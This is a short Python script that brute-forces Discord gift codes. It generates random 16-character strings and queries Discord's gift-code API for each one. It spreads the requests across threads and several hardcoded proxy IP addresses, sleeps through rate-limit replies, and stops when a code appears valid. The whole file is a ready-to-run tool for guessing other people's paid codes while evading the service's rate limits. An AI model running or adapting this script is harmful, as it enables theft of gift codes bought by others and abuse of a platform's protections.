import requests, string, json, time, random, threading

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


def gen_code(length):
	return ("".join(random.choice(string.ascii_letters + string.digits) for _ in range(16)))


def gen_proxy(proxy):
	return {"http": proxy, "https": proxy}


def check_code(code, proxies):
	while True:
		r = requests.get('https://discord.com/api/v6/entitlements/gift-codes/' + code, proxies=proxies)
		#print(r.text)
		result = json.loads(r.text)
		if "message" in result:
			if result["message"] == "You are being rate limited.":
				print(bcolors.WARNING + "======> [WARN] You are being rate limited for: " + str(result["retry_after"]) + " ms" + bcolors.ENDC)
				time.sleep(result["retry_after"] / 1000)
			elif result["message"] == "Unknown Gift Code":
				print(bcolors.FAIL + "======> [INFO] Unknown gift code: " + str(code) + bcolors.ENDC)
				return
			else:
				print(bcolors.OKBLUE + "======> [INFO] Found gift: " + str(code) + bcolors.ENDC)
				quit()
		else:
			print(bcolors.OKBLUE + "======> [ERR] Failed to find 'message' for code: " + str(code) + bcolors.ENDC)
			quit()


def mainloop(proxy):
	while True:
		code = gen_code(16)
		check_code(code, proxy)
		time.sleep(10)


threads = []
proxies = [{},
	gen_proxy('37.120.168.223:8888'),
	gen_proxy('130.61.95.193:3128'),
	gen_proxy('147.75.51.179:3128'),
	gen_proxy('92.244.99.229:3128')
]
for proxy in proxies:
	threads.append(threading.Thread(target=mainloop, args=[proxy]))
for thread in threads:
	thread.start()
